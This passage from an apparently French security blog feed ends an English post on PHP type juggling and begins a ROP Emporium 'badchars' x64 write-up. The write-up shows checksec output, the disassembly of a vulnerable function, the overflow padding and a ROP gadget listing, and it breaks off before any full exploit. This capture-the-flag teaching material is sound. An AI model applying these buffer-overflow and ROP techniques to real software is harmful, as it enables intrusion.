<p>I hope this post helped you understand what is <strong>type juggling</strong>, if you have any questions or if I made English mistakes feel free to contact me on <a href="/about">discord</a>.</p>
<p>Here are a few links if you want to practice exploiting type juggling vulnerabilities</p>
<p><a href="https://theblackside.fr/challenges/web/PHP---Quirk">https://theblackside.fr/challenges/web/PHP---Quirk</a></p>
<p><a href="https://theblackside.fr/challenges/web/super_secure_local_access">https://theblackside.fr/challenges/web/super_secure_local_access</a></p>
<p><a href="https://www.root-me.org/en/Challenges/Web-Server/PHP-type-juggling">https://www.root-me.org/en/Challenges/Web-Server/PHP-type-juggling</a></p>
<h1 id="further-documentation">Further documentation</h1>
<p><a href="https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf">https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf</a></p>
]]></content>
        </item>
        
        <item>
            <title>🇫🇷 ROPEmporium - badchars (x64)</title>
            <link>/posts/2023/01/ropemporium-badchars-x64/</link>
            <pubDate>Wed, 04 Jan 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/01/ropemporium-badchars-x64/</guid>
            <description>Note Cinquièment exo de ROPemporium, je le trouve moins sympa que les autres. Il reprend le principe du challenge précédent, mais il introduit un nouveau gadget pour contourner le &amp;ldquo;filtre&amp;rdquo;: le xor
Comme d&amp;rsquo;habitude, si j&amp;rsquo;ai fait des erreurs, n&amp;rsquo;hésitez pas à me contacter sur discord pour me le dire.
Si vous ne comprenez pas quelque chose, je vous invite à regarder la série dans l&amp;rsquo;ordre.
Et je vous conseille fortement de lire l&amp;rsquo;exercice précédent pour mieux comprendre ce que je fais ici puisque la méchanique principale est la même.</description>
            <content type="html"><![CDATA[<h2 id="note">Note</h2>
<p>Cinquièment exo de ROPemporium, je le trouve moins sympa que les autres. Il reprend le principe du challenge précédent, mais il introduit un nouveau gadget pour contourner le &ldquo;filtre&rdquo;: le <code>xor</code></p>
<p>Comme d&rsquo;habitude, si j&rsquo;ai fait des erreurs, n&rsquo;hésitez pas à me contacter sur <a href="https://discord.com/users/254689803822563348">discord</a> pour me le dire.</p>
<p>Si vous ne comprenez pas quelque chose, je vous invite à <a href="../../../../series/ropemporium-x64-series/">regarder la série dans l&rsquo;ordre</a>.</p>
<p>Et je vous conseille fortement de lire l&rsquo;exercice précédent pour mieux comprendre ce que je fais ici puisque la méchanique principale est la même.</p>
<h2 id="description">Description</h2>
<pre tabindex="0"><code>The good, the bad

Dealing with bad characters is frequently necessary in exploit development, you&#39;ve probably had to deal with them before while encoding shellcode. &#34;Badchars&#34; are the reason that encoders such as shikata-ga-nai exist. When constructing your ROP chain remember that the badchars apply to every character you use, not just parameters but addresses too. To mitigate the need for too much RE the binary will list its badchars when you run it.
Options

ropper has a bad characters option to help you avoid using gadgets whose address will terminate your chain prematurely, it will certainly come in handy. Note that the amount of garbage data you&#39;ll need to send to the ARM challenge is slightly different.
Moar XOR

You&#39;ll still need to deal with writing a string into memory, similar to the write4 challenge, that may have badchars in it. Once your string is in memory and intact, just use the print_file() method to print the contents of the flag file, just like in the last challenge. Think about how we&#39;re going to overcome the badchars issue; should we try to avoid them entirely, or could we use gadgets to change our string once it&#39;s in memory? 
</code></pre><h2 id="file-information">File information</h2>
<p>Avant de commencer à regarder dans l&rsquo;executable, il faut savoir à quoi on s&rsquo;attaque, on va utiliser <code>file</code> pour avoir des informations sur le fichier, puis <code>checksec</code> pour voir les éventuelles sécuritées avec lesquelles il a été compilé</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">file</span> <span style="color:#f92672">badchars</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">badchars</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">/</span><span style="color:#f92672">lib64</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">6c79e265b17cf6845beca7e17d6d8ac2ecb27556</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>On va donc s&rsquo;attaquer à un executable en 64bit, linké dynamiquement et qui n&rsquo;est pas strippé</p>
<p>Maintenant le <code>checksec</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">badchars</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ropemporium/badchars_x64/badchars&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Comme pour le précédent, <strong>NX</strong> est activé donc pas de shellcode, mais ce n&rsquo;est pas un problème puisque la description de l&rsquo;exercice nous indique exactement quoi faire</p>
<h2 id="exploitation">Exploitation</h2>
<p>On va le lancer pour voir ce qu&rsquo;il fait concrètement:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/215351090-d424b61d-309b-4fc7-94b5-2c42cb11dfd3.png" alt="2023-01-29-174453_1698x557_scrot"></p>
<p>On voit que si on entre un nombre élevé de bytes dans l&rsquo;input le programme plante (<code>segfault</code>), ce qui veut dire qu&rsquo;on a commencé à overwrite des registres.</p>
<p>Je vais passer assez vite sur la première partie de l&rsquo;exploit puisque c&rsquo;est la même chose que l&rsquo;<a href="#write4">exo précédent</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass pwnme
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function pwnme:
</span></span><span style="display:flex;"><span><span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0x00007ffff7c008fa</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>: push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008fb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>: mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008fe</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>: sub    rsp,<span style="color:#ae81ff">0x40</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00902</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span>: mov    rax,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2006cf</span>]        <span style="color:#75715e"># 0x7ffff7e00fd8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00909</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">15</span><span style="color:#f92672">&gt;</span>:    mov    rax,QWORD PTR [rax]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0090c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">18</span><span style="color:#f92672">&gt;</span>:    mov    ecx,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00911</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">23</span><span style="color:#f92672">&gt;</span>:    mov    edx,<span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00916</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">28</span><span style="color:#f92672">&gt;</span>:    mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0091b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;</span>:    mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0091e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">36</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c007e0</span> <span style="color:#f92672">&lt;</span>setvbuf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00923</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">41</span><span style="color:#f92672">&gt;</span>:    lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x17a</span>]        <span style="color:#75715e"># 0x7ffff7c00aa4</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0092a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">48</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00780</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0092f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">53</span><span style="color:#f92672">&gt;</span>:    lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x187</span>]        <span style="color:#75715e"># 0x7ffff7c00abd</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00936</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">60</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00780</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0093b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">65</span><span style="color:#f92672">&gt;</span>:    lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0093f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">69</span><span style="color:#f92672">&gt;</span>:    add    rax,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00943</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">73</span><span style="color:#f92672">&gt;</span>:    mov    edx,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00948</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">78</span><span style="color:#f92672">&gt;</span>:    mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0094d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">83</span><span style="color:#f92672">&gt;</span>:    mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00950</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">86</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c007b0</span> <span style="color:#f92672">&lt;</span>memset<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00955</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">91</span><span style="color:#f92672">&gt;</span>:    lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16c</span>]        <span style="color:#75715e"># 0x7ffff7c00ac8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0095c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">98</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00780</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00961</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">103</span><span style="color:#f92672">&gt;</span>:   lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x181</span>]        <span style="color:#75715e"># 0x7ffff7c00ae9</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00968</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">110</span><span style="color:#f92672">&gt;</span>:   mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0096d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">115</span><span style="color:#f92672">&gt;</span>:   call   <span style="color:#ae81ff">0x7ffff7c007a0</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00972</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">120</span><span style="color:#f92672">&gt;</span>:   lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00976</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">124</span><span style="color:#f92672">&gt;</span>:   add    rax,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0097a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">128</span><span style="color:#f92672">&gt;</span>:   mov    edx,<span style="color:#ae81ff">0x200</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0097f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">133</span><span style="color:#f92672">&gt;</span>:   mov    rsi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00982</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">136</span><span style="color:#f92672">&gt;</span>:   mov    edi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00987</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">141</span><span style="color:#f92672">&gt;</span>:   call   <span style="color:#ae81ff">0x7ffff7c007c0</span> <span style="color:#f92672">&lt;</span>read<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0098c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">146</span><span style="color:#f92672">&gt;</span>:   mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>],rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00990</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">150</span><span style="color:#f92672">&gt;</span>:   mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span>],<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00998</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">158</span><span style="color:#f92672">&gt;</span>:   jmp    <span style="color:#ae81ff">0x7ffff7c009eb</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">+</span><span style="color:#ae81ff">241</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0099a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">160</span><span style="color:#f92672">&gt;</span>:   mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x30</span>],<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009a2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">168</span><span style="color:#f92672">&gt;</span>:   jmp    <span style="color:#ae81ff">0x7ffff7c009d5</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">+</span><span style="color:#ae81ff">219</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009a4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">170</span><span style="color:#f92672">&gt;</span>:   mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009a8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">174</span><span style="color:#f92672">&gt;</span>:   movzx  ecx,BYTE PTR [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009ad</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">179</span><span style="color:#f92672">&gt;</span>:   mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x30</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009b1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">183</span><span style="color:#f92672">&gt;</span>:   mov    rdx,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200628</span>]        <span style="color:#75715e"># 0x7ffff7e00fe0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009b8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">190</span><span style="color:#f92672">&gt;</span>:   movzx  eax,BYTE PTR [rdx<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009bc</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">194</span><span style="color:#f92672">&gt;</span>:   cmp    cl,al
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009be</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">196</span><span style="color:#f92672">&gt;</span>:   jne    <span style="color:#ae81ff">0x7ffff7c009c9</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">+</span><span style="color:#ae81ff">207</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009c0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">198</span><span style="color:#f92672">&gt;</span>:   mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009c4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">202</span><span style="color:#f92672">&gt;</span>:   mov    BYTE PTR [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>],<span style="color:#ae81ff">0xeb</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009c9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">207</span><span style="color:#f92672">&gt;</span>:   mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x30</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009cd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">211</span><span style="color:#f92672">&gt;</span>:   add    rax,<span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009d1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">215</span><span style="color:#f92672">&gt;</span>:   mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x30</span>],rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009d5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">219</span><span style="color:#f92672">&gt;</span>:   mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x30</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009d9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">223</span><span style="color:#f92672">&gt;</span>:   cmp    rax,<span style="color:#ae81ff">0x3</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009dd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">227</span><span style="color:#f92672">&gt;</span>:   jbe    <span style="color:#ae81ff">0x7ffff7c009a4</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">+</span><span style="color:#ae81ff">170</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009df</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">229</span><span style="color:#f92672">&gt;</span>:   mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009e3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">233</span><span style="color:#f92672">&gt;</span>:   add    rax,<span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009e7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">237</span><span style="color:#f92672">&gt;</span>:   mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span>],rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009eb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">241</span><span style="color:#f92672">&gt;</span>:   mov    rdx,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009ef</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">245</span><span style="color:#f92672">&gt;</span>:   mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009f3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">249</span><span style="color:#f92672">&gt;</span>:   cmp    rdx,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009f6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">252</span><span style="color:#f92672">&gt;</span>:   jb     <span style="color:#ae81ff">0x7ffff7c0099a</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">+</span><span style="color:#ae81ff">160</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009f8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">254</span><span style="color:#f92672">&gt;</span>:   lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xed</span>]        <span style="color:#75715e"># 0x7ffff7c00aec</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009ff</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">261</span><span style="color:#f92672">&gt;</span>:   call   <span style="color:#ae81ff">0x7ffff7c00780</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00a04</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">266</span><span style="color:#f92672">&gt;</span>:   nop
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00a05</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">267</span><span style="color:#f92672">&gt;</span>:   leave  
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00a06</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">268</span><span style="color:#f92672">&gt;</span>:   ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>Notre padding va être de <code>0x20+0x8</code> bytes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>readelf <span style="color:#f92672">-</span>S badchars
</span></span><span style="display:flex;"><span>There are <span style="color:#ae81ff">29</span> section headers, starting at offset <span style="color:#ae81ff">0x1980</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Section Headers:
</span></span><span style="display:flex;"><span>  [Nr] Name              Type             Address           Offset
</span></span><span style="display:flex;"><span>       Size              EntSize          Flags  Link  Info  Align
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span><span style="display:flex;"><span>  [<span style="color:#ae81ff">23</span>] <span style="color:#f92672">.</span>data             PROGBITS         <span style="color:#ae81ff">0000000000601028</span>  <span style="color:#ae81ff">00001028</span>
</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000010</span>  <span style="color:#ae81ff">0000000000000000</span>  WA       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span></code></pre></div><p><code>.data</code> est situé à l&rsquo;adresse <code>0x00601028</code> et la section a le flag <code>W</code>, donc on peut écrire dedans.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary badchars <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;: mov&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005e2</span> : mov byte ptr [rip <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x200a4f</span>], <span style="color:#ae81ff">1</span> ; pop rbp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400635</span> : mov dword ptr [rbp], esp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400610</span> : mov eax, <span style="color:#ae81ff">0</span> ; pop rbp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400602</span> : mov ebp, esp ; pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040057c</span> : mov edi, <span style="color:#ae81ff">0x601038</span> ; jmp rax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400634</span> : mov qword ptr [r13], r12 ; ret
